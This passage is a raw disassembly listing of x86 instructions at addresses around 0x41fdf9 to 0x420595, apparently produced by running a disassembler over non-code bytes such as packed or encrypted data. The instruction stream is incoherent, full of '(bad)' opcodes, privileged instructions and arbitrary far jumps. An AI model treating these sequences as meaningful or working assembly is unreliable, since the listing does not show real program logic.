  41fdf9:	sbb    al,BYTE PTR [ecx-0x58]
  41fdfc:	std    
  41fdfd:	das    
  41fdfe:	jo     0x41fdd4
  41fe00:	jle    0x41fe74
  41fe02:	adc    BYTE PTR [edi+0x30],dh
  41fe05:	jg     0x41fe13
  41fe07:	bound  esp,QWORD PTR [ecx]
  41fe09:	or     esp,DWORD PTR [ebx+edx*4+0x37]
  41fe0d:	mov    dl,0xe8
  41fe0f:	dec    edi
  41fe10:	lahf   
  41fe11:	jbe    0x41fe08
  41fe13:	sub    ebx,DWORD PTR [ebx]
  41fe15:	add    edi,DWORD PTR [esi+0x373aea0]
  41fe1b:	sub    ebp,DWORD PTR [esi+eax*2-0x7a]
  41fe1f:	sub    ch,BYTE PTR [ecx-0x41]
  41fe22:	jb     0x41fe55
  41fe24:	ins    BYTE PTR es:[edi],dx
  41fe25:	in     al,dx
  41fe26:	sub    ah,bl
  41fe28:	xchg   edx,eax
  41fe29:	add    cl,bl
  41fe2b:	out    0x7b,al
  41fe2d:	mov    dh,0xf8
  41fe2f:	dec    edi
  41fe30:	and    DWORD PTR [ebx],eax
  41fe32:	repnz arpl WORD PTR [esi-0x23],dx
  41fe36:	sbb    DWORD PTR [esi],ebx
  41fe38:	in     al,dx
  41fe39:	jg     0x41fe17
  41fe3b:	fdivrp st(3),st
  41fe3d:	push   es
  41fe3e:	push   ds
  41fe3f:	daa    
  41fe40:	mov    eax,ds:0x82fbb036
  41fe45:	inc    eax
  41fe46:	dec    ebx
  41fe47:	pop    ebx
  41fe48:	dec    esp
  41fe49:	push   edx
  41fe4a:	jmp    eax
  41fe4c:	aas    
  41fe4d:	ret    
  41fe4e:	fist   DWORD PTR [ebp-0x7]
  41fe51:	cmp    eax,0x17879963
  41fe56:	jp     0x41fe1f
  41fe58:	adc    eax,0x47ab6df2
  41fe5d:	outs   dx,BYTE PTR ds:[esi]
  41fe5e:	mov    ebp,0xcef59016
  41fe63:	leave  
  41fe64:	push   cs
  41fe65:	inc    esp
  41fe66:	loopne 0x41fded
  41fe68:	sbb    eax,0xf7b3123a
  41fe6d:	push   DWORD PTR [ebx]
  41fe6f:	adc    BYTE PTR [eax+0x2f],bh
  41fe72:	aam    0x30
  41fe74:	out    dx,eax
  41fe75:	std    
  41fe76:	mov    ch,0xa0
  41fe78:	sbb    eax,0x3025c20c
  41fe7d:	aas    
  41fe7e:	xor    bl,BYTE PTR [ebp-0x27c61e32]
  41fe84:	pop    esi
  41fe85:	fst    st(2)
  41fe87:	(bad)  
  41fe88:	in     al,dx
  41fe89:	push   DWORD PTR [eax]
  41fe8b:	and    al,0x1f
  41fe8d:	jae    0x41fe20
  41fe8f:	lock xchg BYTE PTR [esi],dh
  41fe92:	inc    eax
  41fe93:	ja     0x41fe7d
  41fe95:	mov    es,WORD PTR [eax+0x72c3f89b]
  41fe9b:	fadd   QWORD PTR [eax]
  41fe9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe9e:	sub    DWORD PTR [eax+0x34a85fd6],edi
  41fea4:	in     eax,0x7f
  41fea6:	mov    al,ds:0x5bb2891
  41feac:	jns    0x41fedc
  41feae:	ror    BYTE PTR [ecx],1
  41feb0:	push   0xffffff8c
  41feb2:	pop    ss
  41feb3:	mov    edx,0x2e57e002
  41feb8:	mov    dh,0xdd
  41feba:	xor    esi,0xffffffc5
  41febd:	pop    edi
  41febe:	jmp    0xdc06:0xe6185b62
  41fec5:	lea    eax,[edx]
  41fec7:	dec    esp
  41fec8:	addr16 in eax,0x80
  41fecb:	adc    esp,DWORD PTR [ebx+0x6c630bbd]
  41fed1:	xchg   DWORD PTR [eax+0x4cd8dacc],esi
  41fed7:	je     0x41fee7
  41fed9:	inc    esi
  41feda:	test   BYTE PTR [edx+0x52cd7c1a],dh
  41fee0:	xor    esp,DWORD PTR [esi]
  41fee2:	xor    ch,BYTE PTR [edi-0xd]
  41fee5:	out    dx,eax
  41fee6:	lahf   
  41fee7:	inc    ebx
  41fee8:	or     dh,ah
  41feea:	scas   al,BYTE PTR es:[edi]
  41feeb:	push   0x6040d369
  41fef0:	mov    ebp,0x6b7d47b2
  41fef5:	sub    esp,ebx
  41fef7:	pop    edx
  41fef8:	push   edi
  41fef9:	in     eax,0x10
  41fefb:	rcr    BYTE PTR [edx+eiz*8-0x79095bed],0xa3
  41ff03:	push   eax
  41ff04:	add    BYTE PTR [eax+0x6b168266],cl
  41ff0a:	inc    eax
  41ff0b:	je     0x41fed7
  41ff0d:	test   edi,ebx
  41ff0f:	xchg   DWORD PTR [ecx],ecx
  41ff11:	aad    0xff
  41ff13:	inc    ecx
  41ff14:	aas    
  41ff15:	repnz and eax,0x3334c822
  41ff1b:	fld    QWORD PTR ds:0xe1dd3058
  41ff21:	sub    BYTE PTR [esi+0x36e46383],ch
  41ff27:	cmp    al,0x7d
  41ff29:	jns    0x41ff88
  41ff2b:	xchg   esi,eax
  41ff2c:	adc    BYTE PTR [esi+0x57],ch
  41ff2f:	sbb    al,0xaa
  41ff31:	mov    esp,0xb4a31890
  41ff36:	test   ebp,edi
  41ff38:	sbb    esi,DWORD PTR [esp+esi*1]
  41ff3b:	das    
  41ff3c:	clc    
  41ff3d:	xchg   dh,dh
  41ff3f:	jbe    0x41fee3
  41ff41:	push   ss
  41ff42:	dec    esi
  41ff43:	lock mov dl,0xc5
  41ff46:	icebp  
  41ff47:	xchg   edx,eax
  41ff48:	inc    ecx
  41ff49:	loope  0x41ff1d
  41ff4b:	jb     0x41ff2a
  41ff4d:	push   ss
  41ff4e:	cwde   
  41ff4f:	aad    0xf6
  41ff51:	shl    esi,0xef
  41ff54:	lods   al,BYTE PTR ds:[esi]
  41ff55:	sbb    DWORD PTR [ebx+0xd037ee9],eax
  41ff5b:	mov    edi,0xbcc94bc1
  41ff60:	dec    ebp
  41ff61:	inc    edx
  41ff62:	ss xchg edx,eax
  41ff64:	cmp    al,0x1a
  41ff66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff67:	leave  
  41ff68:	jle    0x41ff84
  41ff6a:	mov    dl,0xee
  41ff6c:	mov    ah,0xe4
  41ff6e:	retf   0xd5b1
  41ff71:	repnz jecxz 0x41ffe1
  41ff74:	jns    0x41ff19
  41ff76:	jl     0x41ffda
  41ff78:	dec    edx
  41ff79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff7a:	in     eax,0xf3
  41ff7c:	repz test edi,ebp
  41ff7f:	xor    BYTE PTR [eax-0x42],dh
  41ff82:	sahf   
  41ff83:	mov    dl,BYTE PTR [edi]
  41ff85:	pop    esp
  41ff86:	lahf   
  41ff87:	jle    0x41ffbc
  41ff89:	cmp    BYTE PTR [ebx+0xb],ah
  41ff8c:	xchg   esi,eax
  41ff8d:	mov    ebx,0x24cdce89
  41ff92:	into   
  41ff93:	(bad)  
  41ff94:	mov    BYTE PTR [ecx+0x54798683],ah
  41ff9a:	add    ah,BYTE PTR [ebp-0x6d]
  41ff9d:	in     al,dx
  41ff9e:	fist   WORD PTR [ecx+0x59]
  41ffa1:	fmul   QWORD PTR [esi-0x2eac8bb9]
  41ffa7:	cli    
  41ffa8:	icebp  
  41ffa9:	repz sahf 
  41ffab:	mov    eax,0x63ef6d3e
  41ffb0:	std    
  41ffb1:	faddp  st(2),st
  41ffb3:	pop    ecx
  41ffb4:	test   eax,0x7c1cce68
  41ffb9:	mov    esi,0x1bef57bc
  41ffbf:	mov    esp,0xccd75fc2
  41ffc4:	sahf   
  41ffc5:	push   edi
  41ffc6:	in     al,0x0
  41ffc8:	aaa    
  41ffc9:	shr    cl,1
  41ffcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ffcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ffcd:	aad    0x57
  41ffcf:	mov    ebx,0x6c2f8b40
  41ffd4:	fs leave 
  41ffd6:	aad    0xbd
  41ffd8:	or     ecx,DWORD PTR [ebp+ebp*2-0x5a4ce6ec]
  41ffdf:	add    eax,0x41427408
  41ffe4:	setge  BYTE PTR [edi+0x699219b5]
  41ffeb:	fs xor al,0xe5
  41ffee:	sbb    ch,bh
  41fff0:	and    cl,dh
  41fff2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fff3:	cmp    esp,ebx
  41fff5:	stos   DWORD PTR es:[edi],eax
  41fff6:	fadd   QWORD PTR [esi+esi*1]
  41fff9:	into   
  41fffa:	mov    eax,ds:0xbda9fc4c
  41ffff:	fs pop ebp
  420001:	xor    al,0x98
  420003:	push   eax
  420004:	lods   al,BYTE PTR ds:[esi]
  420005:	and    DWORD PTR [ecx+0x6c],ebx
  420008:	into   
  420009:	pop    eax
  42000a:	jb     0x420002
  42000c:	adc    eax,0x3f
  42000f:	test   BYTE PTR [edx-0x1707d0e2],al
  420015:	jmp    0xa5f3:0x56d1ba7e
  42001c:	icebp  
  42001d:	sbb    DWORD PTR [edi+0x7],eax
  420020:	sbb    ebp,ebx
  420022:	sub    BYTE PTR [ecx],0xdb
  420025:	popf   
  420026:	inc    ecx
  420027:	xchg   ebp,eax
  420028:	out    0x6c,eax
  42002a:	loop   0x420020
  42002c:	cld    
  42002d:	xor    bl,BYTE PTR [ebp+0x11d3155e]
  420033:	gs jnp 0x42001c
  420036:	pop    es
  420037:	fwait
  420038:	pop    ds
  420039:	push   cs
  42003a:	das    
  42003b:	cwde   
  42003c:	cwde   
  42003d:	test   BYTE PTR [edx+0x10],ah
  420040:	jb     0x42001e
  420042:	stc    
  420043:	sbb    DWORD PTR [edi+0x54],edx
  420046:	push   edi
  420047:	pop    esp
  420048:	std    
  420049:	jns    0x41fffd
  42004b:	in     al,0x9
  42004d:	in     al,dx
  42004e:	and    esp,DWORD PTR ds:0x4b09a122
  420054:	xor    al,0xbf
  420056:	(bad)  [ecx+0x70c8d071]
  42005c:	pop    ecx
  42005d:	aas    
  42005e:	xchg   ecx,eax
  42005f:	push   esi
  420060:	inc    esi
  420061:	test   eax,0xcf7d71
  420066:	sub    esi,esp
  420068:	dec    edx
  420069:	rcl    DWORD PTR [edx-0x5bf1058b],0x65
  420070:	xlat   BYTE PTR ds:[ebx]
  420071:	(bad)  
  420072:	arpl   WORD PTR [edx+0x27],di
  420075:	nop
  420076:	push   edx
  420077:	dec    edi
  420078:	ja     0x420012
  42007a:	xchg   DWORD PTR [eax+0x8969cf],edi
  420080:	icebp  
  420081:	pop    edx
  420082:	rcr    edx,0x42
  420085:	fild   QWORD PTR [ebx-0x10ecd91f]
  42008b:	push   ss
  42008c:	fs xchg edx,eax
  42008e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42008f:	outs   dx,BYTE PTR ds:[esi]
  420090:	xchg   ebx,eax
  420091:	push   es
  420092:	mov    esp,0x7cf2b5c3
  420097:	cmp    eax,ebp
  420099:	inc    edi
  42009a:	sar    bl,1
  42009c:	jae    0x4200f4
  42009e:	aam    0x23
  4200a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4200a1:	jnp    0x420064
  4200a3:	sti    
  4200a4:	pop    ecx
  4200a5:	int    0xf2
  4200a7:	push   ss
  4200a8:	mov    ebx,0x4eefc4c0
  4200ad:	and    DWORD PTR [edi+ecx*4],ebp
  4200b0:	shl    al,0x41
  4200b3:	push   eax
  4200b4:	jnp    0x42010c
  4200b6:	push   esp
  4200b7:	pusha  
  4200b8:	fnstsw WORD PTR [eax]
  4200ba:	inc    ebx
  4200bb:	xchg   ebp,eax
  4200bc:	(bad)  [ebx+0x35ea5bd3]
  4200c2:	push   ebp
  4200c3:	jb     0x42007c
  4200c5:	jo     0x420127
  4200c7:	test   DWORD PTR ds:0x43fbb43c,edx
  4200cd:	xor    al,0x6e
  4200cf:	sbb    al,al
  4200d1:	bound  esp,QWORD PTR [eax-0x4b]
  4200d4:	mov    bl,0x7c
  4200d6:	hlt    
  4200d7:	cli    
  4200d8:	ja     0x420101
  4200da:	sub    DWORD PTR [esi-0x2ad125f8],esp
  4200e0:	cmp    eax,0xee4dbfb7
  4200e5:	into   
  4200e6:	addr16 mov al,0xa
  4200e9:	mov    ebx,0xa84627a3
  4200ee:	sti    
  4200ef:	out    dx,eax
  4200f0:	adc    BYTE PTR cs:[esi+0x2ad272e],ah
  4200f7:	sar    BYTE PTR [esi-0x678dde1],cl
  4200fd:	pusha  
  4200fe:	fsub   DWORD PTR [eax]
  420100:	sub    ebx,DWORD PTR [esi-0x1b]
  420103:	pushf  
  420104:	add    DWORD PTR [edx+0x5fabbf2a],ebp
  42010a:	fld    TBYTE PTR [ebp-0x64596289]
  420110:	neg    DWORD PTR [edx]
  420112:	dec    ecx
  420113:	mov    al,ds:0x47f39f76
  420118:	clc    
  420119:	jno    0x42016d
  42011b:	fdiv   QWORD PTR [ebx+esi*8+0x47]
  42011f:	popf   
  420120:	popa   
  420121:	out    0x93,eax
  420123:	ficom  WORD PTR [ebp-0x2b21a697]
  420129:	imul   esi,DWORD PTR [edi-0x2b],0xffffffb4
  42012d:	pushf  
  42012e:	adc    eax,0xac9588b3
  420133:	lods   eax,DWORD PTR ds:[esi]
  420134:	push   esp
  420135:	and    BYTE PTR ds:0x2a2e68d0,0x46
  42013d:	pop    ebx
  42013e:	push   edx
  42013f:	pop    ds
  420140:	mov    esp,0x15fee93c
  420145:	ins    DWORD PTR es:[edi],dx
  420146:	adc    eax,0x11d9734b
  42014b:	out    0xdf,eax
  42014d:	call   0xef0e:0xb897f45e
  420154:	(bad)  
  420155:	xor    ch,BYTE PTR [ebx-0x3a6994de]
  42015b:	fwait
  42015c:	shl    BYTE PTR [ebx+edx*8],1
  42015f:	xchg   ebp,eax
  420160:	fisttp DWORD PTR [esi-0x44c9045a]
  420166:	push   ebx
  420167:	fcom   QWORD PTR [edi]
  420169:	add    al,0x1d
  42016b:	loop   0x420154
  42016d:	cmp    cl,al
  42016f:	mov    al,ds:0xb872c9be
  420174:	push   ecx
  420175:	nop
  420176:	out    dx,eax
  420177:	jae    0x420180
  420179:	test   eax,0x1fcff563
  42017e:	push   ebp
  42017f:	fst    DWORD PTR [ecx+ebx*4+0x4d]
  420183:	push   eax
  420184:	push   edx
  420185:	stos   DWORD PTR es:[edi],eax
  420186:	pop    esi
  420187:	mov    DWORD PTR [ebx],ebx
  420189:	and    esi,DWORD PTR [ebx]
  42018b:	aam    0x44
  42018d:	push   esi
  42018e:	bnd jns 0x420206
  420191:	pop    edx
  420192:	out    dx,eax
  420193:	inc    esp
  420194:	and    eax,0x10ef88ca
  420199:	or     al,0xb2
  42019b:	popf   
  42019c:	pop    eax
  42019d:	mov    edx,0xe6d819fc
  4201a2:	push   edx
  4201a3:	cwde   
  4201a4:	bound  ecx,QWORD PTR [ebx+0x4]
  4201a7:	scas   eax,DWORD PTR es:[edi]
  4201a8:	jmp    0x4201d6
  4201aa:	icebp  
  4201ab:	mov    dh,0x6a
  4201ad:	clc    
  4201ae:	stos   DWORD PTR es:[edi],eax
  4201af:	and    edi,DWORD PTR [ebp+ebp*1+0x71]
  4201b3:	dec    esi
  4201b4:	jb     0x42013b
  4201b6:	data16 sbb al,0x25
  4201b9:	call   0x7571:0xd65a3d73
  4201c0:	inc    eax
  4201c1:	mov    ecx,0x2c534f76
  4201c6:	clc    
  4201c7:	es mov ch,0x7f
  4201ca:	aam    0x1c
  4201cc:	xor    ch,BYTE PTR [eax]
  4201ce:	ins    DWORD PTR es:[edi],dx
  4201cf:	aaa    
  4201d0:	addr16 mov eax,0xcc5a7c0a
  4201d6:	sbb    bl,BYTE PTR [ebx]
  4201d8:	pop    ss
  4201d9:	ins    DWORD PTR es:[edi],dx
  4201da:	sub    ecx,eax
  4201dc:	xchg   edx,eax
  4201dd:	sub    cl,bl
  4201df:	jg     0x4201f4
  4201e1:	push   0x93d18671
  4201e6:	xor    al,0x1b
  4201e8:	pop    ss
  4201e9:	ja     0x4201ee
  4201eb:	les    eax,FWORD PTR [ebx+0x4]
  4201ee:	sub    BYTE PTR [edi-0x31d2f889],bl
  4201f4:	sahf   
  4201f5:	mov    dh,0x8c
  4201f7:	jb     0x4201c7
  4201f9:	in     eax,dx
  4201fa:	mov    al,ds:0x371cc1ba
  4201ff:	cdq    
  420200:	xchg   edx,eax
  420201:	xlat   BYTE PTR ds:[ebx]
  420202:	xchg   ebx,eax
  420203:	mov    edi,0xa444aae4
  420208:	cmp    eax,esp
  42020a:	fs das 
  42020c:	xor    eax,0xcddea64f
  420211:	and    bh,BYTE PTR [edx]
  420213:	iret   
  420214:	xchg   ebx,eax
  420215:	and    BYTE PTR [ebx-0x589f1668],cl
  42021b:	fsub   QWORD PTR [ecx+0x75]
  42021e:	mov    ecx,0xf8f793fa
  420223:	in     al,dx
  420224:	mov    edi,0x3276818e
  420229:	xchg   edx,eax
  42022a:	xchg   esp,eax
  42022b:	push   ebx
  42022c:	cli    
  42022d:	sbb    edx,0x7d99ad19
  420233:	ja     0x4201ba
  420235:	es ja  0x420238
  420238:	out    dx,al
  420239:	call   FWORD PTR [ecx]
  42023b:	sub    eax,0xc14fba74
  420240:	lds    edi,FWORD PTR [eax+0x14930365]
  420246:	push   0xffffffb0
  420248:	call   0x240a502c
  42024d:	fadd   QWORD PTR [ebp+0x7c]
  420250:	sbb    al,0x8d
  420252:	pop    es
  420253:	xor    al,0x96
  420255:	stos   DWORD PTR es:[edi],eax
  420256:	out    dx,eax
  420257:	repnz dec eax
  420259:	out    0x77,eax
  42025b:	and    al,BYTE PTR [ecx]
  42025d:	inc    esi
  42025e:	mov    edi,ebp
  420260:	fisub  DWORD PTR [edi+eax*8+0x30dce08c]
  420267:	mov    ebx,0x50cc9a25
  42026c:	or     al,0x9b
  42026e:	mov    edi,0xcb453d2a
  420273:	sti    
  420274:	jnp    0x420204
  420276:	iret   
  420277:	lock cmps BYTE PTR ss:[esi],BYTE PTR es:[edi]
  42027a:	dec    esp
  42027b:	add    eax,0x7e536ad8
  420280:	mov    cs:0xf06c0a09,eax
  420286:	or     ebx,edi
  420288:	invd   
  42028a:	inc    ecx
  42028b:	mov    ebp,DWORD PTR [ebx-0x237805e6]
  420291:	pop    eax
  420292:	jle    0x420288
  420294:	adc    bh,0x2d
  420297:	xchg   edx,eax
  420298:	test   BYTE PTR [ebp+0x4d3bfdb1],dl
  42029e:	push   edi
  42029f:	pop    esi
  4202a0:	adc    dl,bh
  4202a2:	or     esp,esi
  4202a4:	outs   dx,BYTE PTR ds:[esi]
  4202a5:	xchg   esp,eax
  4202a6:	ror    BYTE PTR [ebx],0xcb
  4202a9:	and    eax,0x25e6eb88
  4202ae:	adc    BYTE PTR [esi],0xec
  4202b1:	ret    0xaa81
  4202b4:	xor    al,0x88
  4202b6:	mov    dl,0x18
  4202b8:	mov    WORD PTR ds:0x71078201,fs
  4202be:	dec    ebp
  4202bf:	mov    ecx,0xc41d25b7
  4202c4:	in     eax,0x2
  4202c6:	mov    al,BYTE PTR [edi]
  4202c8:	retf   0xebba
  4202cb:	fst    DWORD PTR [esi]
  4202cd:	jg     0x420290
  4202cf:	stc    
  4202d0:	sbb    ebp,esi
  4202d2:	(bad)  
  4202d6:	rol    BYTE PTR [esi-0x12772bcf],cl
  4202dc:	enter  0x5af9,0xd0
  4202e0:	ficom  WORD PTR [edx+0x6b1b0a3c]
  4202e6:	jmp    0x42035a
  4202e8:	jnp    0x420310
  4202ea:	cs sub ecx,ebx
  4202ed:	popa   
  4202ee:	inc    edx
  4202ef:	jle    0x42033f
  4202f1:	mov    dh,0x94
  4202f3:	adc    BYTE PTR [eax+ecx*2-0x1fa1a5f6],0xd9
  4202fb:	push   edi
  4202fc:	inc    ebp
  4202fe:	add    edi,DWORD PTR [edi]
  420300:	lahf   
  420301:	dec    ebx
  420302:	inc    ebp
  420303:	test   BYTE PTR [eax+0x7f],0x77
  420307:	aam    0xf8
  420309:	jecxz  0x4202e5
  42030b:	adc    al,0x64
  42030d:	xor    al,0x1d
  42030f:	in     al,0xa6
  420311:	fdiv   QWORD PTR [ecx]
  420313:	sti    
  420314:	repnz cs ds cdq 
  420318:	loop   0x420326
  42031a:	iret   
  42031b:	mov    ebx,0xd22a8511
  420320:	jp     0x4202e4
  420322:	xchg   ecx,eax
  420323:	addr16 pusha 
  420325:	std    
  420326:	ins    BYTE PTR es:[edi],dx
  420327:	mov    cl,0x30
  420329:	jnp    0x420364
  42032b:	add    bh,bh
  42032d:	imul   ebx,DWORD PTR [esi],0x5
  420330:	and    esp,DWORD PTR [edx-0x7dfac651]
  420336:	mov    bh,0x35
  420338:	pop    es
  420339:	cmp    BYTE PTR [edi+0x54],0x97
  42033d:	in     al,dx
  42033e:	daa    
  42033f:	(bad)  
  420340:	out    0x79,al
  420342:	dec    ebx
  420343:	aam    0xa4
  420345:	ins    BYTE PTR es:[edi],dx
  420346:	ins    BYTE PTR es:[edi],dx
  420347:	push   eax
  420348:	std    
  420349:	dec    esi
  42034a:	xor    esp,edi
  42034c:	fadd   DWORD PTR [ecx]
  42034e:	mov    bl,0xc7
  420350:	mov    bl,0x82
  420352:	mov    al,0xcf
  420354:	enter  0x104e,0xc4
  420358:	mov    esp,0x506d4026
  42035d:	inc    esp
  42035e:	xor    esi,DWORD PTR [ebx+0xd2f0a9]
  420364:	outs   dx,DWORD PTR ds:[esi]
  420365:	dec    eax
  420366:	aas    
  420367:	mov    ch,0xc5
  420369:	std    
  42036a:	ins    BYTE PTR es:[edi],dx
  42036b:	aaa    
  42036c:	(bad)  
  42036e:	lea    ecx,[edx-0x62ad70db]
  420374:	int    0xe3
  420376:	fstp   DWORD PTR [eiz*8+0x46a009aa]
  42037d:	and    ebx,DWORD PTR [edi-0x7d]
  420380:	mov    edx,0x1dec802a
  420385:	int    0x35
  420387:	(bad)  
  420389:	aad    0xdf
  42038b:	sbb    DWORD PTR [edx+ecx*2-0x70c4aded],eax
  420392:	or     DWORD PTR [edx],edx
  420394:	inc    ebp
  420395:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420396:	pop    es
  420397:	mov    al,ch
  420399:	pop    edi
  42039a:	push   edi
  42039b:	int3   
  42039c:	pop    ebx
  42039d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42039e:	mov    DWORD PTR [ebp-0x6b8b1134],esi
  4203a4:	pop    esi
  4203a5:	lock mov al,0x83
  4203a8:	and    DWORD PTR [ebp+edi*8-0x4b83b399],ebx
  4203af:	xlat   BYTE PTR ds:[ebx]
  4203b0:	rol    BYTE PTR [ecx],1
  4203b2:	sbb    eax,0xe6f2fe55
  4203b7:	je     0x42036c
  4203b9:	repz je 0x4203bc
  4203bc:	and    BYTE PTR [esi+0x66],cl
  4203bf:	dec    ecx
  4203c0:	dec    edx
  4203c1:	add    DWORD PTR [ecx+0x2b],0xffffff94
  4203c5:	push   eax
  4203c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4203c7:	lods   al,BYTE PTR ds:[esi]
  4203c8:	pusha  
  4203c9:	push   ds
  4203ca:	cmp    DWORD PTR [edi+eiz*8+0x13],esp
  4203ce:	nop
  4203cf:	sbb    al,BYTE PTR [esi]
  4203d1:	repz sti 
  4203d3:	pop    esp
  4203d4:	push   ebp
  4203d5:	pop    edx
  4203d6:	jbe    0x4203a5
  4203d8:	jnp    0x42040d
  4203da:	hlt    
  4203db:	(bad)  
  4203dc:	adc    DWORD PTR [esi],edi
  4203de:	es mov cl,0xb6
  4203e1:	adc    al,0xa4
  4203e3:	fadd   DWORD PTR [ebx-0x1a251de0]
  4203e9:	imul   DWORD PTR [esi-0x3fb769a1]
  4203ef:	jp     0x42046f
  4203f1:	jl     0x4203bc
  4203f3:	int3   
  4203f4:	xor    eax,0xec5c9a66
  4203f9:	mov    dh,0x92
  4203fb:	cdq    
  4203fc:	cmp    DWORD PTR [eax+0x43ac8ade],0xffffffee
  420403:	cwde   
  420404:	xchg   esp,eax
  420405:	dec    ebx
  420406:	xor    eax,0xb0d5ba62
  42040b:	inc    eax
  42040c:	dec    eax
  42040d:	or     al,0x50
  42040f:	sbb    al,0xb6
  420411:	pop    esi
  420412:	stos   DWORD PTR es:[edi],eax
  420413:	mov    ?,WORD PTR [edi+0x49]
  420416:	xor    DWORD PTR [ebx+eiz*8],0xf8513edc
  42041d:	std    
  42041e:	lahf   
  42041f:	xrelease xchg DWORD PTR [edx-0x44],esp
  420423:	repz call 0xe0db16f5
  420429:	cld    
  42042a:	lods   eax,DWORD PTR ds:[esi]
  42042b:	popf   
  42042c:	add    bl,BYTE PTR [esi]
  42042e:	adc    eax,0xe2dc86aa
  420433:	jle    0x420411
  420435:	femms  
  420437:	test   al,0x3b
  420439:	imul   eax,DWORD PTR [ebp+0x80fed60],0x29
  420440:	add    esp,DWORD PTR ds:0xc833472a
  420446:	mov    dl,0x1d
  420448:	loope  0x420461
  42044a:	and    ch,BYTE PTR ds:0x462c02d9
  420450:	xchg   ebx,eax
  420451:	dec    ecx
  420452:	fs jne 0x4203e5
  420455:	sbb    DWORD PTR [ebp+ecx*2-0x65],edi
  420459:	retf   
  42045a:	push   cs
  42045b:	inc    esp
  42045c:	xor    eax,0x481f2377
  420461:	mov    eax,0x68645a2e
  420466:	lods   eax,DWORD PTR ds:[esi]
  420467:	mov    edx,0xdaf2dd18
  42046c:	sub    edx,DWORD PTR [ebx-0x61]
  42046f:	push   0x5b56811c
  420474:	retf   0x1fd6
  420477:	cmp    eax,0xd8e37e71
  42047c:	push   ecx
  42047d:	xchg   edi,eax
  42047e:	pop    ss
  42047f:	xor    al,0x9a
  420481:	mov    ch,BYTE PTR [eax-0x33]
  420484:	in     eax,0x8d
  420486:	xchg   esi,eax
  420487:	test   al,0xd0
  420489:	push   0x2b
  42048b:	fs ins DWORD PTR es:[edi],dx
  42048d:	pop    eax
  42048e:	jns    0x42045a
  420490:	dec    esp
  420491:	add    ebx,DWORD PTR [ecx+edx*2+0x2d]
  420495:	out    0x3b,al
  420497:	stos   BYTE PTR es:[edi],al
  420498:	fyl2xp1 
  42049a:	fisttp QWORD PTR [eax+eiz*4-0x5d64b3af]
  4204a1:	stos   BYTE PTR es:[edi],al
  4204a2:	xor    esi,DWORD PTR [ebx+edx*2]
  4204a5:	adc    al,0x5
  4204a7:	je     0x42048e
  4204a9:	add    BYTE PTR [esi-0x7b5876e1],ch
  4204af:	mov    dl,0x7
  4204b1:	sub    dh,dh
  4204b3:	push   ebx
  4204b4:	mul    DWORD PTR [esi+0xa]
  4204b7:	daa    
  4204b8:	lds    esp,FWORD PTR [edi+0x69]
  4204bb:	mov    eax,0xd77bfaa3
  4204c0:	push   ecx
  4204c1:	push   ebp
  4204c2:	sub    ebp,DWORD PTR [ecx+ebp*1]
  4204c5:	nop
  4204c6:	lea    ecx,[edi+0x24]
  4204c9:	mov    edx,0x6e7a953f
  4204ce:	pop    ds
  4204cf:	dec    eax
  4204d0:	mov    bh,0x80
  4204d2:	mov    al,ds:0xc8fc0c41
  4204d7:	mov    eax,ds:0x752c92c
  4204dc:	and    DWORD PTR [eax],eax
  4204de:	inc    ecx
  4204df:	(bad)  
  4204e0:	int3   
  4204e1:	cwde   
  4204e2:	loope  0x4204f9
  4204e4:	xchg   edi,eax
  4204e5:	neg    BYTE PTR [edi-0x4c]
  4204e8:	jbe    0x42052c
  4204ea:	seto   BYTE PTR [esi]
  4204ed:	push   0x1e1ae2a
  4204f2:	icebp  
  4204f3:	(bad)  [esi]
  4204f5:	ins    DWORD PTR es:[edi],dx
  4204f6:	jmp    0xc6e15344
  4204fb:	cmp    al,0xd7
  4204fd:	inc    ebp
  4204fe:	push   edi
  4204ff:	and    dh,BYTE PTR [ebp-0x32]
  420502:	loopne 0x4204ac
  420504:	lods   al,BYTE PTR ds:[esi]
  420505:	cs popa 
  420507:	popf   
  420508:	adc    dl,ch
  42050a:	pminsw mm5,QWORD PTR [edx+0x62]
  42050e:	rol    DWORD PTR [edi],0x60
  420511:	inc    edi
  420512:	cmp    dh,BYTE PTR [edi]
  420514:	jge    0x4204ce
  420516:	push   cs
  420517:	cmp    ecx,DWORD PTR [edi+0x2e5df876]
  42051d:	imul   esi,eax,0xfffffff9
  420520:	or     BYTE PTR [edi+0x3e0e155c],0xff
  420527:	(bad)  [ebp-0x255cde15]
  42052d:	xchg   edi,eax
  42052e:	nop
  42052f:	xchg   ecx,eax
  420530:	jb     0x420510
  420532:	mov    ?,WORD PTR [esi+0x6]
  420535:	mov    dh,0x11
  420537:	xchg   edi,ebx
  420539:	pop    ss
  42053a:	mul    bh
  42053c:	cwde   
  42053d:	pop    eax
  42053e:	mov    bh,0x8c
  420540:	retf   0x40b4
  420543:	cmp    eax,0x9c093a3c
  420548:	sbb    DWORD PTR [edx+0x3e1e9154],ecx
  42054e:	daa    
  42054f:	dec    edx
  420550:	shl    ebp,0x76
  420553:	lock test eax,0xae07a79e
  420559:	xchg   BYTE PTR [edx-0x39b5b2b7],cl
  42055f:	lea    esi,[ecx+0x4cc59d9]
  420565:	pop    ss
  420566:	push   es
  420567:	mov    dl,0x10
  420569:	lods   eax,DWORD PTR ds:[esi]
  42056a:	pop    ebx
  42056b:	sahf   
  42056c:	mov    esi,0x1b2880b3
  420571:	push   edi
  420572:	mov    al,0xdc
  420574:	jns    0x420559
  420576:	mov    cs:0x15768864,eax
  42057c:	iret   
  42057d:	inc    ebp
  42057e:	jno    0x42059e
  420580:	xor    dl,dh
  420582:	inc    esp
  420583:	mov    ds:0xef9d9de7,al
  420588:	push   ecx
  420589:	outs   dx,DWORD PTR ds:[esi]
  42058a:	nop
  42058b:	inc    ebx
  42058c:	js     0x42054d
  42058e:	scas   eax,DWORD PTR es:[edi]
  42058f:	xor    bh,BYTE PTR ds:0x6b4af55f
  420595:	and    cl,BYTE PTR [esi]
